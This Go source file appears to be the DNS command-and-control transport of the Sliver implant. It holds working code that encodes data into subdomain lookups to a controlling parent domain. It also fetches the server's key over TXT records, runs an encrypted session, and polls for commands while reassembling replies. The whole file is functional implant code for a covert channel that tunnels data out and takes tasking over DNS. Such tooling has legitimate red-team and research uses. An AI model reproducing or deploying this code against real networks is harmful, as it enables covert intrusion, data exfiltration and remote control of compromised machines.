package main

// {{if .DNSParent}}

import (
	"bytes"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"encoding/pem"
	"errors"
	"fmt"
	"math"

	// {{if .Debug}}
	"log"
	// {{end}}

	insecureRand "math/rand"
	"net"
	pb "sliver/protobuf/sliver"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/golang/protobuf/proto"
)

const (
	sessionIDSize = 16

	dnsSendDomainSeg  = 63
	dnsSendDomainStep = 189 // 63 * 3

	domainKeyMsg  = "_domainkey"
	blockReqMsg   = "b"
	clearBlockMsg = "cb"

	sessionInitMsg     = "si"
	sessionPollingMsg  = "sp"
	sessionEnvelopeMsg = "se"

	nonceStdSize = 6

	blockIDSize = 6

	maxBlocksPerTXT = 200 // How many blocks to put into a TXT resp at a time
)

var (
	dnsCharSet = []rune("abcdefghijklmnopqrstuvwxyz0123456789-_")

	pollInterval = 1 * time.Second

	replayMutex = &sync.RWMutex{}
	replay      = &map[string]bool{}
)

// RecvBlock - Single block from server
type RecvBlock struct {
	Index int
	Data  string
}

// BlockReassembler - Data is encoded and split into `Blocks`
type BlockReassembler struct {
	ID   string
	Size int
	Recv chan *RecvBlock
}

// Basic message replay protect, hash the cipher text and store it in a map
// we should never see duplicate ciphertexts. We have to maintain the map
// for the duration of execution which isn't great. In the future we may want
// to add time-stamps and clear old hashes to keep memory usage lower.
// A re-key message could also help since we could clear all old msg digests
func isReplayAttack(ciphertext []byte) bool {
	sha := sha256.New()
	sha.Write(ciphertext)
	digest := base64.RawStdEncoding.EncodeToString(sha.Sum(nil))
	replayMutex.Lock()
	defer replayMutex.Unlock()
	if _, ok := (*replay)[digest]; ok {
		// {{if .Debug}}
		log.Printf("WARNING: Replay attack detected")
		// {{end}}
		return true
	}
	(*replay)[digest] = true
	return false
}

// --------------------------- DNS SESSION SEND ---------------------------

func dnsLookup(domain string) (string, error) {
	// {{if .Debug}}
	log.Printf("[dns] lookup -> %s", domain)
	// {{end}}
	txts, err := net.LookupTXT(domain)
	if err != nil || len(txts) == 0 {
		// {{if .Debug}}
		log.Printf("[!] failure -> %s", domain)
		// {{end}}
		return "", err
	}
	return strings.Join(txts, ""), nil
}

// Send raw bytes of an arbitrary length to the server
func dnsSend(parentDomain string, msgType string, sessionID string, data []byte) (string, error) {

	encoded := dnsEncodeToString(data)
	size := int(math.Ceil(float64(len(encoded)) / float64(dnsSendDomainStep)))
	// {{if .Debug}}
	log.Printf("Encoded message length is: %d (size = %d)", len(encoded), size)
	// {{end}}

	nonce := dnsNonce(20) // Larger nonce for this use case

	// DNS domains are limited to 254 characters including '.' so that means
	// Base 32 encoding, so (n*8 + 4) / 5 = 63 means we can encode 39 bytes
	// So we have 63 * 3 = 189 (+ 3x '.') + metadata
	// So we can send up to (3 * 39) 117 bytes encoded as 3x 63 character subdomains
	// We have a 4 byte uint32 seqence number, max msg size (2**32) * 117 = 502511173632
	//
	// Format: (subdata...).(seq).(nonce).(session id).(_)(msgType).<parent domain>
	//                [63].[63].[63].[4].[20].[12].[3].
	//                    ... ~235 chars ...
	//                Max parent domain: ~20 chars
	//
	for index := 0; index < size; index++ {
		// {{if .Debug}}
		log.Printf("Sending domain #%d of %d", index+1, size)
		// {{end}}
		start := index * dnsSendDomainStep
		stop := start + dnsSendDomainStep
		if len(encoded) <= stop {
			stop = len(encoded)
		}
		// {{if .Debug}}
		log.Printf("Send data[%d:%d] %d bytes", start, stop, len(encoded[start:stop]))
		// {{end}}
		data := encoded[start:stop] // Total data we're about to send

		subdomains := int(math.Ceil(float64(len(data)) / dnsSendDomainSeg))
		// {{if .Debug}}
		log.Printf("Subdata subdomains: %d", subdomains)
		// {{end}}

		subdata := []string{} // Break up into at most 3 subdomains (189)
		for dataIndex := 0; dataIndex < subdomains; dataIndex++ {
			dataStart := dataIndex * dnsSendDomainSeg
			dataStop := dataStart + dnsSendDomainSeg
			if len(data) < dataStop {
				dataStop = len(data)
			}
			// {{if .Debug}}
			log.Printf("Subdata #%d [%d:%d]: %#v", dataIndex, dataStart, dataStop, data[dataStart:dataStop])
			// {{end}}
			subdata = append(subdata, data[dataStart:dataStop])
		}
		// {{if .Debug}}
		log.Printf("Encoded subdata: %#v", subdata)
		// {{end}}

		subdomain := strings.Join(subdata, ".")
		seq := dnsEncodeToString(dnsDomainSeq(index))
		domain := subdomain + fmt.Sprintf(".%s.%s.%s.%s.%s", seq, nonce, sessionID, msgType, parentDomain)
		_, err := dnsLookup(domain)
		if err != nil {
			return "", err
		}

	}
	// A domain with "_" before the msgType means we're doing sending data
	domain := fmt.Sprintf("%s.%s.%s.%s", nonce, sessionID, "_"+msgType, parentDomain)
	txt, err := dnsLookup(domain)
	if err != nil {
		return "", err
	}
	return txt, nil
}

// Binary encoding of the current position of the data encoded into a domain
func dnsDomainSeq(seq int) []byte {
	buf := new(bytes.Buffer)
	binary.Write(buf, binary.LittleEndian, uint32(seq))
	return buf.Bytes()
}

// --------------------------- DNS SESSION START ---------------------------

func dnsStartSession(parentDomain string) (string, AESKey, error) {
	sessionKey := RandomAESKey()

	pubKey := dnsGetServerPublicKey()
	dnsSessionInit := &pb.DNSSessionInit{
		Key: sessionKey[:],
	}
	data, _ := proto.Marshal(dnsSessionInit)
	encryptedData, err := RSAEncrypt(data, pubKey)
	if err != nil {
		return "", AESKey{}, err
	}

	encryptedSessionID, err := dnsSend(parentDomain, sessionInitMsg, "_", encryptedData)
	if err != nil {
		return "", AESKey{}, errors.New("Failed to start new DNS session")
	}
	// {{if .Debug}}
	log.Printf("Encrypted session id = %s", encryptedSessionID)
	// {{end}}
	encryptedSessionIDData, err := base64.RawStdEncoding.DecodeString(encryptedSessionID)
	if err != nil || isReplayAttack(encryptedSessionIDData) {
		// {{if .Debug}}
		log.Printf("Session ID decode error %v", err)
		// {{end}}
		return "", AESKey{}, errors.New("Failed to decode session id")
	}
	sessionID, err := GCMDecrypt(sessionKey, encryptedSessionIDData)
	if err != nil {
		return "", AESKey{}, errors.New("Failed to decrypt session id")
	}

	return string(sessionID), sessionKey, nil
}

// Get the public key of the server
func dnsGetServerPublicKey() *rsa.PublicKey {
	pubKeyPEM, err := LookupDomainKey(sliverName, dnsParent)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to fetch domain key %v", err)
		// {{end}}
		return nil
	}

	pubKeyBlock, _ := pem.Decode([]byte(pubKeyPEM))
	if pubKeyBlock == nil {
		// {{if .Debug}}
		log.Printf("failed to parse certificate PEM")
		// {{end}}
		return nil
	}
	// {{if .Debug}}
	log.Printf("RSA Fingerprint: %s", fingerprintSHA256(pubKeyBlock))
	// {{end}}

	certErr := rootOnlyVerifyCertificate([][]byte{pubKeyBlock.Bytes}, [][]*x509.Certificate{})
	if certErr == nil {
		cert, _ := x509.ParseCertificate(pubKeyBlock.Bytes)
		return cert.PublicKey.(*rsa.PublicKey)
	}

	// {{if .Debug}}
	log.Printf("Invalid certificate %v", err)
	// {{end}}
	return nil
}

// LookupDomainKey - Attempt to get the server's RSA public key
func LookupDomainKey(selector string, parentDomain string) ([]byte, error) {
	selector = strings.ToLower(selector)
	nonce := dnsNonce(nonceStdSize)
	domain := fmt.Sprintf("_%s.%s.%s.%s", nonce, selector, domainKeyMsg, parentDomain)

	txt, err := dnsLookup(domain)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Error fetching server certificate %v", err)
		// {{end}}
		return nil, err
	}
	certPEM, err := base64.RawStdEncoding.DecodeString(txt)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Error decoding certificate %v", err)
		// {{end}}
		return nil, err
	}
	return certPEM, nil
}

// --------------------------- DNS SESSION SEND ---------------------------

func dnsSessionSendEnvelope(parentDomain string, sessionID string, sessionKey AESKey, envelope *pb.Envelope) {

	envelopeData, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to encode envelope %v", err)
		// {{end}}
		return
	}

	encryptedEnvelope, err := GCMEncrypt(sessionKey, envelopeData)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to encrypt session envelope %v", err)
		// {{end}}
		return
	}

	_, err = dnsSend(parentDomain, sessionEnvelopeMsg, sessionID, encryptedEnvelope)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to send session envelope %v", err)
		// {{end}}
	}
}

// --------------------------- DNS SESSION RECV ---------------------------

func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ctrl chan bool, recv chan *pb.Envelope) {
	for {
		select {
		case <-ctrl:
			return
		case <-time.After(pollInterval):
			nonce := dnsNonce(nonceStdSize)
			domain := fmt.Sprintf("_%s.%s.%s.%s", nonce, sessionID, sessionPollingMsg, parentDomain)
			txt, err := dnsLookup(domain)
			if err != nil {
				// {{if .Debug}}
				log.Printf("Lookup error %v", err)
				// {{end}}
			}
			if txt == "0" {
				continue
			}
			// {{if .Debug}}
			log.Printf("Poll returned new block(s): %#v", txt)
			// {{end}}

			rawTxt, _ := base64.RawStdEncoding.DecodeString(txt)
			if isReplayAttack(rawTxt) {
				break
			}
			pollData, err := GCMDecrypt(sessionKey, rawTxt)
			if err != nil {
				// {{if .Debug}}
				log.Printf("Failed to decrypt poll response")
				// {{end}}
				break
			}
			dnsPoll := &pb.DNSPoll{}
			err = proto.Unmarshal(pollData, dnsPoll)
			if err != nil {
				// {{if .Debug}}
				log.Printf("Invalid poll response")
				// {{end}}
				break
			}

			for _, blockPtr := range dnsPoll.Blocks {
				go func(blockPtr *pb.DNSBlockHeader) {
					envelope := getSessionEnvelope(parentDomain, sessionKey, blockPtr)
					if envelope != nil {
						recv <- envelope
					}
				}(blockPtr)
			}
		}
	}
}

// Poll returned the server has a message for us, fetch the entire envelope
func getSessionEnvelope(parentDomain string, sessionKey AESKey, blockPtr *pb.DNSBlockHeader) *pb.Envelope {
	blockData, err := getBlock(parentDomain, blockPtr.Id, fmt.Sprintf("%d", blockPtr.Size))
	if err != nil || isReplayAttack(blockData) {
		// {{if .Debug}}
		log.Printf("Failed to fetch block with id = %s", blockPtr.Id)
		// {{end}}
		return nil
	}
	envelopeData, err := GCMDecrypt(sessionKey, blockData)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to decrypt block with id = %s (%v)", blockPtr.Id, err)
		// {{end}}
		return nil
	}
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(envelopeData, envelope)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message %v", err)
		// {{end}}
		return nil
	}
	return envelope
}

// Perform concurrent DNS requests to fetch all blocks of data
func getBlock(parentDomain string, blockID string, size string) ([]byte, error) {
	n, err := strconv.Atoi(size)
	if err != nil {
		return nil, err
	}
	reasm := &BlockReassembler{
		ID:   blockID,
		Size: n,
		Recv: make(chan *RecvBlock, n),
	}

	// How many TXT records do we need to fetch?
	txtRecords := int(math.Ceil(float64(n) / float64(maxBlocksPerTXT)))

	var wg sync.WaitGroup
	data := make([]string, txtRecords)

	for index := 0; index < txtRecords; index++ {
		wg.Add(1)
		start := index * maxBlocksPerTXT
		stop := start + maxBlocksPerTXT
		if txtRecords < stop {
			stop = txtRecords
		}
		go fetchBlockSegments(parentDomain, reasm, index, start, stop, &wg)
	}

	done := make(chan bool)
	go func() {
		for block := range reasm.Recv {
			data[block.Index] = block.Data
		}
		done <- true
	}()
	wg.Wait()
	close(reasm.Recv)
	<-done // Avoid race where range of reasm.Recv isn't complete

	msg := []string{}
	for _, buf := range data {
		msg = append(msg, buf)
	}

	msgData, err := base64.RawStdEncoding.DecodeString(strings.Join(msg, ""))
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to decode block")
		// {{end}}
		return nil, errors.New("Failed to decode block")
	}

	nonce := dnsNonce(nonceStdSize)
	go func() {
		domain := fmt.Sprintf("%s.%s._cb.%s", nonce, reasm.ID, parentDomain)
		// {{if .Debug}}
		log.Printf("[dns] lookup -> %s", domain)
		// {{end}}
		net.LookupTXT(domain)
	}()

	return msgData, nil
}

// Fetch a single block
func fetchBlockSegments(parentDomain string, reasm *BlockReassembler, index int, start int, stop int, wg *sync.WaitGroup) {
	defer wg.Done()
	nonce := dnsNonce(nonceStdSize)
	domain := fmt.Sprintf("_%s.%d.%d.%s.%s.%s", nonce, start, stop, reasm.ID, blockReqMsg, parentDomain)
	// {{if .Debug}}
	log.Printf("[dns] fetch -> %s", domain)
	// {{end}}
	txt, err := dnsLookup(domain)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to fetch blocks %v", err)
		// {{end}}
		return
	}
	reasm.Recv <- &RecvBlock{
		Index: index,
		Data:  txt,
	}

}

// --------------------------- HELPERS ---------------------------

func dnsRegisterSliver(send chan *pb.Envelope) {
	// {{if .Debug}}
	log.Printf("Sending registration information ...")
	// {{end}}
	registerEnvelope := getRegisterSliver()
	send <- registerEnvelope
}

func dnsBlockHeaderID() string {
	insecureRand.Seed(time.Now().UnixNano())
	blockID := []rune{}
	for i := 0; i < blockIDSize; i++ {
		index := insecureRand.Intn(len(dnsCharSet))
		blockID = append(blockID, dnsCharSet[index])
	}
	return string(blockID)
}

// dnsNonce - Generate a nonce of a given size
func dnsNonce(size int) string {
	insecureRand.Seed(time.Now().UnixNano())
	nonce := []rune{}
	for i := 0; i < size; i++ {
		index := insecureRand.Intn(len(dnsCharSet))
		nonce = append(nonce, dnsCharSet[index])
	}
	return string(nonce)
}

func fingerprintSHA256(block *pem.Block) string {
	hash := sha256.Sum256(block.Bytes)
	b64hash := base64.RawStdEncoding.EncodeToString(hash[:])
	return strings.TrimRight(b64hash, "=")
}

// --------------------------- ENCODER ---------------------------

var base32Alphabet = "0123456789abcdefghjkmnpqrtuvwxyz"
var sliverBase32 = base32.NewEncoding(base32Alphabet)

// EncodeToString encodes the given byte slice in base32
func dnsEncodeToString(input []byte) string {
	encoded := sliverBase32.EncodeToString(input)
	// {{if .Debug}}
	log.Printf("[base32] %#v", encoded)
	// {{end}}
	return strings.TrimRight(encoded, "=")
}

// DecodeString decodes the given base32 encodeed bytes
func dnsDecodeString(raw string) ([]byte, error) {
	pad := 8 - (len(raw) % 8)
	nb := []byte(raw)
	if pad != 8 {
		nb = make([]byte, len(raw)+pad)
		copy(nb, raw)
		for index := 0; index < pad; index++ {
			nb[len(raw)+index] = '='
		}
	}
	return sliverBase32.DecodeString(string(nb))
}

// SessionIDs are public parameters in this use case
// so it's only important that they're unique
func dnsSessionID() string {
	insecureRand.Seed(time.Now().UnixNano())
	sessionID := []rune{}
	for i := 0; i < sessionIDSize; i++ {
		index := insecureRand.Intn(len(dnsCharSet))
		sessionID = append(sessionID, dnsCharSet[index])
	}
	return "_" + string(sessionID)
}

// {{end}} -DNSParent
